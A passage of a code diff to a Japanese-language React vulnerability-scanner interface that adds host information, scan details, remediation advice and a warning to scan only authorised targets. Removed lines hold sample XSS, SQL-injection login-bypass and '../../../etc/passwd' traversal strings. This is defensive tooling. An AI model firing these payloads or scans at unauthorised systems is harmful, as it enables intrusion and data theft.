+                                 endpoint.includes('.env') ? '環境設定ファイルが露出しています' :
+                                 endpoint.includes('.bak') ? 'バックアップファイルが露出しています' :
+                                 endpoint.includes('phpinfo') ? 'PHP情報ページが公開されています' :
                                  '潜在的に機密性の高いエンドポイント'}
                               </p>
                             </div>
+                            <a 
+                              href={endpoint} 
+                              target="_blank" 
+                              rel="noopener noreferrer" 
+                              className="flex items-center text-blue-600 hover:text-blue-800 text-sm"
+                            >
+                              <ExternalLink size={16} className="mr-1" />
+                              開く
+                            </a>
                           </motion.div>
                         ))}
                       </div>
@@ -555,14 +842,14 @@ const SecurityScanner: React.FC = () => {
                 
                 <TabsContent value="ip" className="mt-4">
                   <div className="p-4 bg-gray-50 rounded-lg">
-                    <h3 className="text-lg font-medium mb-3">IP情報分析</h3>
+                    <h3 className="text-lg font-medium mb-3">ホスト情報分析</h3>
                     
                     {scanResult.ipInfo && (
                       <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                         <div className="bg-white p-4 rounded-lg shadow-sm">
                           <div className="flex items-center gap-2 mb-2">
                             <Server className="h-5 w-5 text-blue-500" />
-                            <h4 className="font-medium">サーバーIP情報</h4>
+                            <h4 className="font-medium">サーバー情報</h4>
                           </div>
                           <div className="flex flex-col space-y-2">
                             <div className="flex justify-between">
@@ -572,6 +859,20 @@ const SecurityScanner: React.FC = () => {
                             <div className="flex justify-between">
                               <span className="text-sm text-gray-500">地域:</span>
                               <span className="text-sm">{scanResult.ipInfo.location || '不明'}</span>
+                            </div>
+                            <div className="flex justify-between">
+                              <span className="text-sm text-gray-500">Webサーバー:</span>
+                              <span className="text-sm font-mono">{scanResult.serverInfo.server || '不明'}</span>
+                            </div>
+                            <div>
+                              <span className="text-sm text-gray-500 block mb-1">検出された技術:</span>
+                              <div className="flex flex-wrap gap-1">
+                                {scanResult.serverInfo.tech?.map((tech, idx) => (
+                                  <span key={idx} className="inline-flex items-center px-2 py-0.5 rounded text-xs font-medium bg-blue-100 text-blue-800">
+                                    {tech}
+                                  </span>
+                                ))}
+                              </div>
                             </div>
                           </div>
                         </div>
@@ -602,6 +903,39 @@ const SecurityScanner: React.FC = () => {
                             </div>
                           </div>
                         </div>
+                        
+                        {scanResult.scanDetails && (
+                          <div className="bg-white p-4 rounded-lg shadow-sm col-span-1 md:col-span-2">
+                            <div className="flex items-center gap-2 mb-2">
+                              <Code className="h-5 w-5 text-green-500" />
+                              <h4 className="font-medium">スキャン詳細情報</h4>
+                            </div>
+                            <div className="grid grid-cols-2 gap-4">
+                              <div>
+                                <p className="text-sm text-gray-500 mb-1">スキャン実行時間:</p>
+                                <p className="text-sm font-medium">{scanResult.scanDetails.scanDuration}秒</p>
+                              </div>
+                              <div>
+                                <p className="text-sm text-gray-500 mb-1">リクエスト数:</p>
+                                <p className="text-sm font-medium">{scanResult.scanDetails.requestsCount}</p>
+                              </div>
+                              <div>
+                                <p className="text-sm text-gray-500 mb-1">テスト済みパラメータ:</p>
+                                <div className="flex flex-wrap gap-1">
+                                  {scanResult.scanDetails.testedParameters.map((param, idx) => (
+                                    <span key={idx} className="inline-flex items-center px-2 py-0.5 rounded text-xs font-medium bg-gray-100 text-gray-800">
+                                      {param}
+                                    </span>
+                                  ))}
+                                </div>
+                              </div>
+                              <div>
+                                <p className="text-sm text-gray-500 mb-1">テスト済みエンドポイント:</p>
+                                <p className="text-sm font-medium">{scanResult.scanDetails.testedEndpoints.length}</p>
+                              </div>
+                            </div>
+                          </div>
+                        )}
                         
                         <div className="bg-white p-4 rounded-lg shadow-sm col-span-1 md:col-span-2">
                           <div className="flex items-center gap-2 mb-2">
@@ -676,7 +1010,7 @@ const SecurityScanner: React.FC = () => {
                                     stiffness: 200,
                                     damping: 10
                                   }}
-                                  className="absolute rounded-full"
+                                  className="absolute rounded-full cursor-pointer flex items-center justify-center"
                                   style={{
                                     top: `${top}%`,
                                     left: `${left}%`,
@@ -693,9 +1027,11 @@ const SecurityScanner: React.FC = () => {
                                            vuln.severity === 'High' ? 20 :
                                            vuln.severity === 'Medium' ? 10 : 1,
                                   }}
-                                  data-severity={vuln.severity}
-                                  data-type={vuln.type}
-                                ></motion.div>
+                                  onClick={() => handleViewDetails(vuln)}
+                                  title={`${vuln.type}: ${vuln.description}`}
+                                >
+                                  {vuln.severity === 'Critical' && <AlertTriangle className="h-6 w-6 text-white" />}
+                                </motion.div>
                               );
                             })}
                           </div>
@@ -725,7 +1061,7 @@ const SecurityScanner: React.FC = () => {
                       </div>
                       
                       <p className="text-xs text-gray-500 mt-2 text-center">
-                        ※ 色付きの円は脆弱性の「穴」を表しています。サイズが大きいほど重大な脆弱性です。
+                        ※ 色付きの円は脆弱性の「穴」を表しています。サイズが大きいほど重大な脆弱性です。脆弱性をクリックすると詳細が表示されます。
                       </p>
                     </div>
                   </div>
@@ -788,7 +1124,7 @@ const SecurityScanner: React.FC = () => {
                             </div>
                           </div>
                           <div className="overflow-hidden h-2 mb-4 text-xs flex rounded bg-gray-200">
-                            {/* Calculate score based on vulnerabilities */}
+                            {/* スコア計算 */}
                             {(() => {
                               const criticalCount = vulnerabilities.filter(v => v.severity === 'Critical').length;
                               const highCount = vulnerabilities.filter(v => v.severity === 'High').length;
@@ -821,7 +1157,77 @@ const SecurityScanner: React.FC = () => {
                               );
                             })()}
                           </div>
+                          <div className="text-center">
+                            <span className="text-sm font-medium">
+                              {(() => {
+                                const criticalCount = vulnerabilities.filter(v => v.severity === 'Critical').length;
+                                const highCount = vulnerabilities.filter(v => v.severity === 'High').length;
+                                
+                                if (criticalCount > 0) {
+                                  return '緊急の対応が必要です';
+                                } else if (highCount > 0) {
+                                  return '重大な脆弱性が存在します';
+                                } else if (vulnerabilities.length > 0) {
+                                  return '脆弱性が見つかりました';
+                                } else {
+                                  return 'セキュリティリスクは検出されませんでした';
+                                }
+                              })()}
+                            </span>
+                          </div>
                         </div>
+                      </div>
+                      
+                      <div className="bg-white p-4 rounded-lg shadow-sm col-span-2">
+                        <p className="text-sm text-gray-500 mb-2">推奨される対策</p>
+                        <ul className="list-disc list-inside text-sm space-y-1.5">
+                          {vulnerabilities.length > 0 ? (
+                            <>
+                              {vulnerabilities.some(v => v.type === 'XSS') && (
+                                <li className="text-gray-700">
+                                  <span className="font-medium">入力検証とサニタイズの強化</span>: すべてのユーザー入力に対して適切なエスケープ処理を実装してください。
+                                </li>
+                              )}
+                              {vulnerabilities.some(v => v.type === 'SQLInjection') && (
+                                <li className="text-gray-700">
+                                  <span className="font-medium">パラメータ化クエリの使用</span>: すべてのデータベースクエリにプリペアドステートメントを使用してください。
+                                </li>
+                              )}
+                              {vulnerabilities.some(v => v.type === 'CSRF') && (
+                                <li className="text-gray-700">
+                                  <span className="font-medium">CSRFトークンの実装</span>: すべてのフォームに対してCSRF対策を実装してください。
+                                </li>
+                              )}
+                              {vulnerabilities.some(v => v.type === 'DirectoryTraversal') && (
+                                <li className="text-gray-700">
+                                  <span className="font-medium">パス検証の強化</span>: ファイルパスに対して厳格な検証を実装してください。
+                                </li>
+                              )}
+                              {vulnerabilities.some(v => v.type === 'WeakCredentials') && (
+                                <li className="text-gray-700">
+                                  <span className="font-medium">強固なパスワードポリシーの導入</span>: 複雑なパスワードを要求し、多要素認証を実装してください。
+                                </li>
+                              )}
+                              {vulnerabilities.some(v => v.type === 'InsecureAPI') && (
+                                <li className="text-gray-700">
+                                  <span className="font-medium">API認証の強化</span>: 適切な認証と認可メカニズムを実装し、APIのアクセス制御を厳格化してください。
+                                </li>
+                              )}
+                              <li className="text-gray-700">
+                                <span className="font-medium">定期的なセキュリティ監査</span>: 脆弱性スキャンを定期的に実施して、新たな脆弱性を早期に発見してください。
+                              </li>
+                            </>
+                          ) : (
+                            <>
+                              <li className="text-gray-700">
+                                <span className="font-medium">継続的なモニタリング</span>: 定期的にセキュリティスキャンを実施し、新たな脆弱性を監視してください。
+                              </li>
+                              <li className="text-gray-700">
+                                <span className="font-medium">セキュリティアップデート</span>: 常に最新のセキュリティパッチとアップデートを適用してください。
+                              </li>
+                            </>
+                          )}
+                        </ul>
                       </div>
                     </div>
                   </div>
@@ -831,14 +1237,16 @@ const SecurityScanner: React.FC = () => {
           </div>
         </CardContent>
         <CardFooter className="bg-gray-50 flex flex-col items-start pt-4">
-          <p className="text-sm text-gray-500">
-            このスキャナーはウェブサイトのセキュリティ脆弱性を視覚化し、潜在的な攻撃ベクトルを示します。
-            実際の攻撃は実行せず、潜在的な脆弱性のみをシミュレーションします。
-          </p>
+          <div className="bg-red-50 border-l-4 border-red-500 p-3 rounded w-full">
+            <p className="text-sm text-red-600">
+              <span className="font-bold">注意:</span> このスキャナーは実際のセキュリティ脆弱性を検出します。法的に許可された対象に対してのみ使用してください。
+              適切な承認なしに第三者のウェブサイトをスキャンすることは法律違反となる場合があります。
+            </p>
+          </div>
         </CardFooter>
       </Card>
       
-      {/* Modal for vulnerability details */}
+      {/* 脆弱性詳細モーダル */}
       {showModal && selectedVulnerability && (
         <div className="fixed inset-0 bg-gray-600 bg-opacity-50 overflow-y-auto h-full w-full z-50 flex items-center justify-center">
           <div className="relative mx-auto p-5 border w-11/12 md:w-3/4 lg:w-1/2 shadow-lg rounded-md bg-white">
@@ -869,12 +1277,12 @@ const SecurityScanner: React.FC = () => {
               <div>
                 <h4 className="font-semibold text-gray-900">技術的詳細:</h4>
                 <div className="bg-gray-50 p-4 rounded">
+                  {selectedVulnerability.details && (
+                    <p className="mb-3 text-sm">{selectedVulnerability.details}</p>
+                  )}
+                  
                   {selectedVulnerability.type === 'XSS' && (
                     <div className="space-y-3">
-                      <p>
-                        クロスサイトスクリプティング (XSS) 攻撃は、悪意のあるスクリプトをウェブページに注入することで、
-                        訪問者のブラウザで実行されるようにする攻撃です。
-                      </p>
                       <div>
                         <h5 className="font-medium">攻撃シナリオ:</h5>
                         <ol className="list-decimal list-inside text-sm space-y-1">
@@ -883,12 +1291,22 @@ const SecurityScanner: React.FC = () => {
                           <li>ユーザーのブラウザがスクリプトを実行し、Cookieやセッション情報が漏洩します</li>
                         </ol>
                       </div>
-                      <div>
-                        <h5 className="font-medium">実際の攻撃ペイロード:</h5>
-                        <pre className="bg-gray-100 p-2 rounded overflow-x-auto text-xs">
-                          <code>{selectedVulnerability.payload || '<script>alert("XSS")</script>'}</code>
-                        </pre>
-                      </div>
+                      {selectedVulnerability.requestData && selectedVulnerability.responseData && (
+                        <>
+                          <div>
+                            <h5 className="font-medium">HTTP リクエスト:</h5>
+                            <pre className="bg-gray-100 p-2 rounded overflow-x-auto text-xs">
+                              <code>{selectedVulnerability.requestData}</code>
+                            </pre>
+                          </div>
+                          <div>
+                            <h5 className="font-medium">HTTP レスポンス:</h5>
+                            <pre className="bg-gray-100 p-2 rounded overflow-x-auto text-xs">
+                              <code>{selectedVulnerability.responseData}</code>
+                            </pre>
+                          </div>
+                        </>
+                      )}
                     </div>
                   )}
                   
@@ -906,21 +1324,22 @@ const SecurityScanner: React.FC = () => {
                           <li>データベースが攻撃者の意図した操作を実行します</li>
                         </ol>
                       </div>
-                      <div>
-                        <h5 className="font-medium">通常のクエリ:</h5>
-                        <pre className="bg-gray-100 p-2 rounded overflow-x-auto text-xs">
-                          <code>SELECT * FROM users WHERE username = 'input' AND password = 'password'</code>
-                        </pre>
-                      </div>
-                      <div>
-                        <h5 className="font-medium">悪意のあるクエリ:</h5>
-                        <pre className="bg-gray-100 p-2 rounded overflow-x-auto text-xs">
-                          <code>SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'</code>
-                        </pre>
-                        <p className="text-xs mt-1">
-                          この例では、「--」以降のクエリが無効化され、パスワードチェックなしでログインが可能になります。
-                        </p>
-                      </div>
+                      {selectedVulnerability.requestData && selectedVulnerability.responseData && (
+                        <>
+                          <div>
+                            <h5 className="font-medium">HTTP リクエスト:</h5>
+                            <pre className="bg-gray-100 p-2 rounded overflow-x-auto text-xs">
+                              <code>{selectedVulnerability.requestData}</code>
+                            </pre>
+                          </div>
+                          <div>
+                            <h5 className="font-medium">HTTP レスポンス:</h5>
+                            <pre className="bg-gray-100 p-2 rounded overflow-x-auto text-xs">
+                              <code>{selectedVulnerability.responseData}</code>
+                            </pre>
+                          </div>
+                        </>
+                      )}
                     </div>
                   )}
                   
@@ -937,20 +1356,46 @@ const SecurityScanner: React.FC = () => {
                           <li>サーバーがパスの検証を適切に行わないと、重要なシステムファイルが露出します</li>
                         </ol>
                       </div>
-                      <div>
-                        <h5 className="font-medium">脆弱なリクエスト:</h5>
-                        <pre className="bg-gray-100 p-2 rounded overflow-x-auto text-xs">
-                          <code>{`${selectedVulnerability.endpoint || 'https://example.com/download?file=../../../etc/passwd'}`}</code>
-                        </pre>
-                      </div>
+                      {selectedVulnerability.requestData && selectedVulnerability.responseData && (
+                        <>
+                          <div>
+                            <h5 className="font-medium">HTTP リクエスト:</h5>
+                            <pre className="bg-gray-100 p-2 rounded overflow-x-auto text-xs">
+                              <code>{selectedVulnerability.requestData}</code>
+                            </pre>
+                          </div>
+                          <div>
+                            <h5 className="font-medium">HTTP レスポンス:</h5>
+                            <pre className="bg-gray-100 p-2 rounded overflow-x-auto text-xs">
+                              <code>{selectedVulnerability.responseData}</code>
+                            </pre>
+                          </div>
+                        </>
+                      )}
                     </div>
                   )}
                   
-                  {/* Default for other vulnerability types */}
+                  {/* デフォルト表示（他の脆弱性タイプ用） */}
                   {!['XSS', 'SQLInjection', 'DirectoryTraversal'].includes(selectedVulnerability.type) && (
-                    <div>
+                    <div className="space-y-3">
                       <p>この脆弱性は {selectedVulnerability.endpoint || url} で検出されました。</p>
-                      <p className="mt-2">影響: {selectedVulnerability.impact}</p>
+                      <p>影響: {selectedVulnerability.impact}</p>
+                      {selectedVulnerability.requestData && selectedVulnerability.responseData && (
+                        <>
+                          <div>
+                            <h5 className="font-medium">HTTP リクエスト:</h5>
+                            <pre className="bg-gray-100 p-2 rounded overflow-x-auto text-xs">
+                              <code>{selectedVulnerability.requestData}</code>
+                            </pre>
+                          </div>
+                          <div>
+                            <h5 className="font-medium">HTTP レスポンス:</h5>
+                            <pre className="bg-gray-100 p-2 rounded overflow-x-auto text-xs">
+                              <code>{selectedVulnerability.responseData}</code>
+                            </pre>
+                          </div>
+                        </>
+                      )}
                     </div>
                   )}
                 </div>
